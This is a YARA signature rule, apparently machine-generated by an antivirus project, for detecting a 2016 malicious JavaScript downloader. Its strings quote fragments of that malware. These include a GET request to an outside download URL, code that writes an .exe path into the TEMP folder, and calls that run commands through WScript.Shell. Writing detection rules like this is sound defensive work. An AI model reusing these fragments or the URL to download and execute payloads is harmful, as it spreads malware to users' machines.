rule sig_20160329_4173a47bc265be58b15e46050fcf24f7 {
  meta:
    description = "datamaliciousorder - file 20160329_4173a47bc265be58b15e46050fcf24f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bc3f1c4ec2663ae1435b80125bc6d5ace0791b66ca22a666b4d564f9abf14fe9"

  strings:
    $s1  = "ZD[tZ](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function P() {return KL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rGTZRlANH.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[b1](b() * 11); if (ZD[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function fA(c, Bf){PJ = PJ * 1; return c - Bf;};" fullword ascii
    $s5  = "var KL = function eG() {return WScript[Sj](\"WScript.Shell\");}(), AM = 11;" fullword ascii
    $s6  = "function j(){return \"\" + Cm;};" fullword ascii
    $s7  = "function Gk(DI){KL[\"Run\"](DI, PJ, PJ);};" fullword ascii
    $s8  = "function pf() {return ((IG == true) && (IG == yT)) ? 1 : PJ;};" fullword ascii
    $s9  = "return fA(kJ, rA);" fullword ascii
    $s10 = "function b(){return 22;};" fullword ascii
    $s11 = "function vF()" fullword ascii
    $s12 = "function KD(A0) {var TI = (1, 2, 3, 4, 5, A0); return TI;};" fullword ascii
    $s13 = "function Qn(){return Sj;};" fullword ascii
    $s14 = "var hS = new this[\"Date\"]();" fullword ascii
    $s15 = " while (n){" fullword ascii
    $s16 = "var Yt = false;" fullword ascii
    $s17 = "yT = true; " fullword ascii
    $s18 = "IG = true; " fullword ascii
    $s19 = "var yT = false;" fullword ascii
    $s20 = "var IG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}